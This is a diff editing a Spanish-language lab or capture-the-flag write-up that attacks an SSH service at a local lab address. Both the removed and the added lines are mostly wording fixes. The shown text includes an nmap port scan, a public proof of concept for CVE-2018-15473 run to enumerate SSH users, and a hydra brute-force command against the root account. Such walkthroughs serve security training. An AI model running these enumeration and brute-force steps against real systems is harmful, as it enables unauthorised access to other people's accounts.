@@ -5,7 +5,7 @@
 
 ## Nmap
 
-El escaneo de **nmap** nos enseña la existencia de un servicio SSH.
+El escaneo de **nmap** nos enseña la existencia de un servicio **SSH**.
 
 ```
 > nmap --open --min-rate 10000 -Pn -n -oN scans/allTCPPorts $target
@@ -39,7 +39,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
 
 ## SSH (22 TCP Port)
 
-Investigando el servicio vemos que es una versión antigua que tiene una vulnerabilidad numerada como [CVE-2018-15473](https://nvd.nist.gov/vuln/detail/cve-2018-15473) el cual nos permite una enumeración de usuarios. Con este [PoC](https://github.com/Sait-Nuri/CVE-2018-15473) y una lista de usuarios podemos conseguir que usuarios existen en el sistema
+Investigando el servicio vemos que es una versión antigua que tiene una vulnerabilidad numerada como [CVE-2018-15473](https://nvd.nist.gov/vuln/detail/cve-2018-15473) el cual nos permite una enumeración de usuarios sobre el servicio **SSH**. Con este [PoC](https://github.com/Sait-Nuri/CVE-2018-15473) y una lista de usuarios podemos conseguir que usuarios existen en el sistema
 
 ```
 > python2 CVE-2018-15473.py  172.17.0.2 -w /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
@@ -67,13 +67,7 @@ Valid Users:
 root
 ```
 
-Desucribros
-
-```
-
-```
-
-Ahora, con el nombre de usuario encontrado podemos hacer fuerza bruta contra el servicio SSH con **hydra**.
+Desucribrmos que el usuario root está habilitado en el servicio **SSH**. Ahora, con el nombre de usuario encontrado podemos hacer fuerza bruta contra el servicio **SSH** con **hydra**.
 
 ```
 > hydra -l root -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh
